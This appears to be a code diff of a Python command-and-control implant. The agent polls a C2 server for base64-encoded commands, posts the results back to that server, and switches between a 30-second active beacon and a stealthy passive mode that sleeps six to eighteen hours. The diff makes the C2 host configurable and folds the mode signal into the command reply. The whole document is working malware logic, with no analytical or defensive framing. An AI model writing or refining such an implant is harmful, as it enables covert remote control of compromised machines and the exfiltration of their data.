@@ -45,23 +45,14 @@ def request_commands():
     """Make HTTP request 
 
     Returns:
+        string: polling status
         array: list of commands
     """
-    r = requests.get(f"http://0.0.0.0:{PORT}/commands")
+    r = requests.get(f"http://{HOST}:{PORT}/commands")
 
-    data = base64.urlsafe_b64decode(bytes(r.text.encode('utf-8'))).decode('utf-8')
-    return data.split()
+    data = base64.urlsafe_b64decode(bytes(r.text.encode('utf-8'))).decode('utf-8').split()
+    return data[0], data[1:]
 
-def check_active():
-    """Check if agent should be active or passive
-
-    Returns:
-        bool: true if active
-    """
-    r = requests.get(f"http://0.0.0.0:{PORT}/mode")
-    if r.text == "active":
-        return True
-    return False
 
 def send_data(data):
     """Make POST request to C2 server with command data
@@ -73,7 +64,7 @@ def send_data(data):
         int: Status code from C2 server
     """
     data = base64.urlsafe_b64encode(bytes(data.encode('utf-8')))
-    r = requests.post(f"http://0.0.0.0:{PORT}/data", data = data)
+    r = requests.post(f"http://{HOST}:{PORT}/data", data = data)
     return r.status_code
 
 def run_builtin(command):
@@ -216,14 +207,14 @@ def check_mark():
     return False
 
 
-def delay_for_mode():
+def delay_for_mode(mode):
     """Generate delay appropraite to mode
 
         Active - 30 seconds
         Passive - between 6 and 18 hours
     """
 
-    if check_active():
+    if mode == "active":
         delay = 30 
     else:
         delay = random.randrange(21600, 64800)
@@ -244,7 +235,7 @@ if __name__ == "__main__":
     last_commands = ""
 
     while 1:
-        cmds = request_commands()
+        active, cmds = request_commands()
 
         cmdhash = hashlib.md5(''.join(cmds).encode('utf-8')).hexdigest()
 
@@ -255,4 +246,4 @@ if __name__ == "__main__":
         else:
             print("No change from C2")
         
-        delay_for_mode()
+        delay_for_mode(active)
